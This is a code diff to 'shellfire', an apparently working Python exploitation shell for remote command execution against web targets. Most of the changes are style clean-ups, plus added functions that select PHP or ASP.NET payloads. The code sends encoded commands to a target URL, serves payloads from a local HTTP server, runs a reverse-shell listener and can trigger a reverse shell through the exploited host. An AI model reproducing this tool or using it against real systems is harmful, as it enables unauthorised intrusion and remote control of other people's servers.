@@ -9,6 +9,24 @@ import threading
 import time
 from config import cfg, state
 from plugin_collection import plugins
+from payloads import get_aspnet_payload, get_php_payload
+
+
+############################################################
+## Payloads
+
+
+def payload_aspnet():
+  cfg.payload = get_aspnet_payload(cfg.marker)
+  cfg.payload_type = "ASP.NET"
+  return
+
+
+def payload_php():
+  cfg.payload = get_php_payload(cfg.marker)
+  cfg.payload_type = "PHP"
+  return
+
 
 ############################################################
 ## Functions
@@ -38,11 +56,11 @@ def http_server(port):
   sock.bind((addr, port))
   sock.listen(1)
   ## server loop
-  while http_running == True:
+  while http_running is True:
     try:
       if not conn:
         conn, addr = sock.accept()
-      request = conn.recv(1024)
+      conn.recv(1024)
 
       http_response = "HTTP/1.1 200 OK\n\n" + cfg.payload + "\n"
 
@@ -55,6 +73,7 @@ def http_server(port):
         sys.stderr.write("[!] Err. socket.error : %s\n" % e)
       pass
   sys.stdout.write("[*] HTTP Server stopped\n")
+
 
 def rev_shell(addr, port):
   ## setup listener for reverse shell
@@ -70,7 +89,8 @@ def rev_shell(addr, port):
   ## listener loop
   while True:
     socket_list = [conn, sys.stdin]
-    read_sockets, write_sockets, error_sockets = select.select(socket_list , [], [])
+    read_sockets, write_sockets, error_sockets = select.select(
+        socket_list, [], [])
 
     ## wait for connections
     for s in read_sockets:
@@ -91,14 +111,16 @@ def rev_shell(addr, port):
   state.revshell_running = False
   return
 
+
 def cmd_auth(cmd):
   ## configure HTTP Basic auth settings
   if len(cmd) > 1:
-    cfg.auth_user, cfg.auth_pass = cmd[2][len(cmd[0])+1:].split(":",1)
+    cfg.auth_user, cfg.auth_pass = cmd[2][len(cmd[0]) + 1:].split(":", 1)
     cfg.auth = requests.auth.HTTPBasicAuth(cfg.auth_user, cfg.auth_pass)
   else:
     sys.stdout.write("[*] HTTP Auth: %s:%s\n" % (cfg.auth_user, cfg.auth_pass))
   return
+
 
 def cmd_config(cmd):
   ## manage our configs
@@ -126,9 +148,10 @@ def cmd_config(cmd):
         with open(name, 'r') as my_config:
           cfg.load(json.load(my_config))
           sys.stdout.write("[*] Config restored.\n")
-      except:
+      except Exception:
         sys.stdout.write("[!] Unable to restore config!\n")
   return
+
 
 def cmd_cookies(cmd):
   ## configure cookies to be sent to target
@@ -145,6 +168,7 @@ def cmd_cookies(cmd):
     sys.stderr.write("[!] %s\n" % e)
   sys.stdout.write("[*] Cookies set: %s\n" % json.dumps(cfg.cookies))
   return
+
 
 def cmd_encode(cmd):
   ## if no params passed, display current encoding plugins
@@ -170,11 +194,13 @@ def cmd_encode(cmd):
     sys.stdout.write("[!] Error: %s\n" % (e))
   return
 
+
 def cmd_exit(cmd):
-  http_running = False
+  state.http_running = False
   if os.path.isfile(cfg.history_file):
     readline.write_history_file(cfg.history_file)
   sys.exit(0)
+
 
 def cmd_find(cmd):
   ## run "find" on remote target
@@ -191,13 +217,15 @@ def cmd_find(cmd):
   state.exec_cmd = True
   return
 
+
 def cmd_headers(cmd):
   """List or configure the HTTP request headers
     .headers
     .headers default
     .headers {"X-EXAMPLE-HEADER": "SomeValueHere" }
   Args:
-      cmd (Str): "default" to reset the headers, otherwise a JSON string of the preferred header set
+    cmd (Str): "default" to reset the headers, otherwise a JSON string of
+                the preferred header set.
   """
   if len(cmd) < 1:
     sys.stderr.write("[!] Invalid parameters\n")
@@ -225,12 +253,14 @@ def cmd_headers(cmd):
   sys.stdout.write(json.dumps(cfg.headers, indent=2) + "\n")
   return
 
+
 def cmd_help(cmd):
   if len(cmd) == 2:
     show_help(cmd[1])
   else:
     show_help()
   return
+
 
 def cmd_history(cmd):
   ## configure history settings for shellfire (via readline)
@@ -252,22 +282,23 @@ def cmd_history(cmd):
       sys.stdout.write("[*] History writing is disabled\n")
   return
 
+
 def cmd_http(cmd):
   ## control our local http server
   global http_running
   if len(cmd) == 1:
-    if http_running == True:
+    if http_running is True:
       sys.stdout.write("[*] HTTP server listening on %s\n" % cfg.http_port)
       sys.stdout.write("[*] HTTP payload: %s\n" % cfg.payload_type)
     else:
       sys.stdout.write("[*] HTTP server is not running\n")
     return
   if cmd[1] == "start":
-    if http_running == False:
+    if http_running is False:
       if len(cmd) > 2:
         try:
           cfg.http_port = int(cmd[2])
-        except Exception as e:
+        except Exception:
           sys.stderr.write("[!] Invalid port value: %s\n" % (cmd[2]))
           return
       s = threading.Thread(target=http_server, args=(cfg.http_port,))
@@ -277,7 +308,7 @@ def cmd_http(cmd):
     else:
       sys.stderr.write("[!] HTTP server already running\n")
   elif cmd[1] == "stop":
-    if http_running == True:
+    if http_running is True:
       http_running = False
       time.sleep(1)
     else:
@@ -292,6 +323,7 @@ def cmd_http(cmd):
       return
     sys.stdout.write("[*] HTTP payload set: %s\n" % cfg.payload_type)
   return
+
 
 def cmd_marker(cmd):
   print(cmd)
@@ -319,6 +351,7 @@ def cmd_marker(cmd):
     sys.stdout.write("[!] Bad marker param!\n")
   return
 
+
 def cmd_method(cmd):
   ## configure HTTP method to use against the target
   if len(cmd) > 2:
@@ -333,16 +366,19 @@ def cmd_method(cmd):
   sys.stdout.write("[*] HTTP method set: %s\n" % cfg.method.upper())
   return
 
+
 def cmd_phpinfo(cmd):
   ## trigger phpinfo payload
   state.userinput = "_show_phpinfo"
   state.exec_cmd = True
   return
 
+
 def cmd_plugins(cmd):
   ## show our available plugins
   sys.stdout.write("[*] Available plugins: %s\n" % (' '.join(plugins.plugins)))
   return
+
 
 def cmd_post(cmd):
   ## configure POST data to send
@@ -359,6 +395,7 @@ def cmd_post(cmd):
   sys.stdout.write("[*] POST data set: %s\n" % json.dumps(cfg.post_data))
   return
 
+
 def cmd_referer(cmd):
   ## set HTTP referer
   if len(cmd) > 1:
@@ -366,6 +403,7 @@ def cmd_referer(cmd):
     cfg.headers['Referer'] = " ".join(cmd)
   sys.stdout.write("[*] Referer set: %s\n" % cfg.headers['Referer'])
   return
+
 
 def cmd_shell(cmd):
   ## initiate a reverse shell via rce
@@ -388,19 +426,22 @@ def cmd_shell(cmd):
   state.exec_cmd = True
   return
 
+
 def cmd_url(cmd):
   ## set URL for remote target
   if len(cmd) > 1:
-    cfg.url = state.userinput[len(cmd[0])+1:]
+    cfg.url = state.userinput[len(cmd[0]) + 1:]
   sys.stdout.write("[*] Exploit URL set: %s\n" % cfg.url)
   return
+
 
 def cmd_useragent(cmd):
   ## set the user agenet to send to target
   if len(cmd) > 1:
-    cfg.headers['User-Agent'] = state.userinput[len(cmd[0])+1:]
+    cfg.headers['User-Agent'] = state.userinput[len(cmd[0]) + 1:]
   sys.stdout.write("[*] User-Agent set: %s\n" % cfg.headers['User-Agent'])
   return
+
 
 def send_payload():
   ## execute our command to the remote target
@@ -412,7 +453,7 @@ def send_payload():
       try:
         for enc in cfg.encode_chain:
           cmd = plugins.plugins[enc].run(cmd)
-      except:
+      except Exception:
         pass
 
     ## generate GET payloads
@@ -445,9 +486,20 @@ def send_payload():
       sys.stdout.write("[D] Headers %s\n" % json.dumps(header_data))
     try:
       if cfg.method == "post":
-        r = requests.post(query, data=post_data, verify=False, cookies=cookie_data, headers=header_data, auth=cfg.auth)
+        r = requests.post(
+            query,
+            data=post_data,
+            verify=False,
+            cookies=cookie_data,
+            headers=header_data,
+            auth=cfg.auth)
       else:
-        r = requests.get(query, verify=False, cookies=cookie_data, headers=header_data, auth=cfg.auth)
+        r = requests.get(
+            query,
+            verify=False,
+            cookies=cookie_data,
+            headers=header_data,
+            auth=cfg.auth)
       ## sanitize the output. we only want to see our commands if possible
       output = ""
       if cfg.marker:
@@ -475,8 +527,9 @@ def send_payload():
       sys.stdout.flush()
   return
 
+
 ############################################################
-## ommand list
+## Command list
 """Data structure of all available shellfire commands.
 """
 command_list = {
@@ -511,7 +564,7 @@ command_list = {
     "help_text": [
       ".encode          - show current encoding used before sending commands.\n",
       ".encode <string> - encode commands with plugin <string> before sending.\n",
-      "                   you may pass multiple plugins separated with spaces or pipes.\n",
+      "      * you may pass multiple plugins separated with spaces or pipes.\n",
     ],
   },
   "exit": {
@@ -573,7 +626,8 @@ command_list = {
     "help_text": [
       ".marker              - show the current payload output marker.\n",
       ".marker set <string> - set the payload output marker to string.\n",
-      ".marker out <number> - the output indices to display after splitting on our marker.\n",
+      ".marker out <number> - the output indices to display after splitting on",
+      "                       our marker.\n",
     ],
   },
   "method": {
